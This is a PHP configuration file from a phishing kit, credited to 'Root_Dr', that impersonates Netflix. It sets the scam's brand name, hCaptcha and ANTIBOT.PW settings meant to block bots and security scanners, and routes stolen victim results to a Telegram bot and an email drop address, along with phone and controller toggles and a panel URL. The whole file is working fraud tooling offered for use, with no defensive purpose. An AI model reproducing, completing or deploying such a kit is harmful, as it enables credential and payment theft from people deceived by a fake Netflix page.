<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

// Hcaptcha https://www.hcaptcha.com/
define("HCAPTCHA", true); // true or false
define("SECRETKEY", 'ES_ef68c82d736e431ba862ce230c80fdd0'); // secretkey hcaptcha
define("SITEKEY", '36741375-7087-49b9-8b3d-b12f526ebe3c'); // site key hcaptcha

define("TESTMODE", false); // true or false
define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("FLAG", '🎞️');
define("SCAM_NAME", 'NETFLIX');
define("WEBSITE", 'https://netflix.com/');
$currentUrlPath = $_SERVER['REQUEST_URI'];
$domain = $_SERVER['HTTP_HOST'];
preg_match('~^/web/([^/]+)/?~', $currentUrlPath, $matches);
$folderName = isset($matches[1]) ? $matches[1] : '';
$url = "https://$domain/web/$folderName";

define("PANEL", $url);
// TELEGRAM BOT REZ CONFIG
if(isset($_COOKIE['idtel']) && isset($_COOKIE['tokentel'])){
$TrubFtub = $_COOKIE['idtel'];
$cRetVckr = $_COOKIE['tokentel'];
} else {
$TrubFtub = '';
$cRetVckr = '';
}
define("TOKEN", $cRetVckr);
define("CHATID", $TrubFtub);

define("NOTIF", true); // true or false
define("NOTIF_CHATID", $TrubFtub);

// MAIL REZ CONFIG
define("BULLET", 'your@email.com');

define("PHONE", true); // true or false
define("CONTROLLER", true); // true or false
